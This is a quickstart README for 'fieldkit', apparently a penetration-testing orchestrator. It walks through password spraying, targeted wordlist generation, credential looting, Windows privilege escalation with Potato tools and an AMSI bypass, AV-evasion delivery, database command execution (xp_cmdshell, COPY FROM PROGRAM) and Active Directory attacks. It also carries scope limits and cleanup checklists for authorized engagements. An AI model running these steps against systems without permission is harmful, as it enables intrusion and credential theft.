# fieldkit — quickstart

Run an engagement start to finish. One SQLite store holds everything — stop and
resume anytime; `fieldkit status` tells you where you are. **Authorized engagements only.**

> Prereqs: your usual tools on `$PATH` (netexec/nxc, impacket, certipy, evil-winrm;
> for `poc`: msfvenom/wixl/gcc/mingw; for DBs: psql/mongosh). fieldkit is stdlib-only
> and drives them — **`fieldkit init`** runs preflight inline and flags missing spine
> tools right at the start; **`fieldkit preflight`** shows the full list.

## The run

```bash
# 1 — set up
fieldkit init "ACME Corp"                                # tells you if nxc is missing, up front
fieldkit config set lhost=10.10.14.9 lport=443 domain=corp.local
fieldkit scope allow 10.0.0.0/16                         # optional: refuse out-of-scope IPs

# 2 — scope in (single IP, a range, or a file of IPs/CIDRs)
fieldkit add hosts 10.0.0.0/24

# 3 — a credential you have (autodetects password / NT hash / LM:NT / domain / UPN / local)
fieldkit add cred 'corp.local/jdoe:Winter2025!'

# 4 — validate credentials across scope; the loop finds admins, loots them,
#     promotes recovered secrets, and re-sprays until dry
fieldkit spray smb

# 4a — no credential yet? Build a targeted wordlist and spray it:
fieldkit wordlist Acme Corp --years 2024 2025 --long -o passwords.txt
fieldkit spray --wordlist --userlist users.txt --passlist passwords.txt

# 5 — enumerate a Pwn3d host, then rank the next moves
fieldkit enum 10.0.0.7
fieldkit analyze

# 6 — escalate: walk the ranked vectors, stop at first proof
fieldkit escalate 10.0.0.7 --allow config-change
# (offers to `prep` the first manual route inline — no context switch)

# 7 — go wider: SMB shares, on-box configs, databases, AD (any order)
fieldkit spider 10.0.0.7                                # scrub SMB shares for secrets
fieldkit scrub  10.0.0.5                                # scrub /etc /opt /home on a Linux foothold
fieldkit mssql escalate 10.0.0.9 --allow config-change  # SQL login → sysadmin → xp_cmdshell
fieldkit postgres escalate 10.0.0.11                    # PG login → COPY FROM PROGRAM
fieldkit mongodb escalate 10.0.0.12                     # unauth check + role enum + user dump
fieldkit roast --dc 10.0.0.10
fieldkit delegation --dc 10.0.0.10
fieldkit adcs find --dc 10.0.0.10
fieldkit bloodhound import ./bh/

# 8 — deliver
fieldkit report --check                                 # anti-fabrication gate
fieldkit report --formats md,docx -o report             # Findings + Observations
fieldkit report --cleanup -o report                     # INTERNAL revert checklist
fieldkit export-recce recce.json                        # fold proven findings back to recce
```

Run **`fieldkit status`** anytime — one command shows the phase, top-3 next moves,
which hosts you're pwned on, and any missing spine tools.

## If…

- **No credential yet?** Two paths:
  - `fieldkit ingest nxc run.log` folds in a prior nxc capture.
  - `fieldkit wordlist Acme --long --out p.txt` → `fieldkit spray --wordlist --userlist u.txt --passlist p.txt`. The wordlist generator has curated keyboard walks + wrapper phrases for modern ≥12-char policies; `fieldkit wordlist --rules` shows every mutation.
- **Enum blocked by "no credential proven on X"?** That means a cred is stored but hasn't been validated *on this host* yet — run `fieldkit spray` first. If no cred is stored at all, the error says exactly that instead.
- **Spider a Windows box for credentials in shares?** `fieldkit spider <host>` drives `nxc -M spider_plus` — downloads every file under 50KB, scrubs for GPP cpassword, unattend passwords, connection strings, and script-embedded creds. Promoted creds land in the loop. The downloaded corpus is recorded as a deletion obligation in the cleanup manifest.
- **Scrub configs on a Linux foothold?** `fieldkit scrub <host>` runs the same scrubbers over `/etc`, `/opt`, `/home`, `/var/www`. Recovered creds are promoted.
- **A vector needs a tool that isn't on the box?** `escalate` **auto-stages** it from the arsenal, or **auto-builds** it (`poc`) and stages it, then retries — nothing to do.
- **A delivery gets caught by AV?** `escalate` marks it red and **climbs the delivery ladder** (native → in-memory → script) automatically. For SeImpersonate it tries every Potato variant (GodPotato / PrintSpoofer / JuicyPotatoNG / SweetPotato / SharpEfsPotato) both as `.exe` and reflectively-loaded in memory. AMSI bypass on the in-memory rung: `fieldkit config set amsi_bypass=on`.
- **A non-sysadmin MSSQL login?** `fieldkit mssql escalate <ip> --allow config-change` tries xp_cmdshell directly first, then EXECUTE AS impersonation. Same shape for `fieldkit postgres escalate` (SET ROLE → COPY FROM PROGRAM) and `fieldkit mongodb escalate` (unauth probe + role check + user dump).
- **A route can't be one-shot** (overwrite a running service binary, kernel LPE against a client host)? `escalate` hands it to `prep`: `fieldkit prep 10.0.0.7 <vector.key>` builds the payload and prints exactly where to place it and the steps. On an interactive `escalate` run, it offers this inline.
- **Blocked by the safety gate?** Riskier vectors need `--allow config-change` (or `crash-risk`).
- **Just want to see the plan?** `fieldkit escalate <ip> --dry-run` renders it — works even before any cred is proven on the target.
- **Coming back after a break?** `fieldkit status` gives you the whole board in one command.

## Deliverables

- `report.md` / `.docx` / `.pdf` — the customer report (proven **Findings** + **Observations** + **Credentials recovered during testing**, with a "Reached via" line under each finding so the audit trail is inline). Add `--proven-only` for a Findings-only version.
- `report.cleanup.md` — **internal** checklist of every change to revert. Do not send to the client.
- `recce.json` — proven findings for the recce triage tool.

More detail: **`TECHNICAL-GUIDE.md`** · the visual map: **`WORKFLOW.md`**.
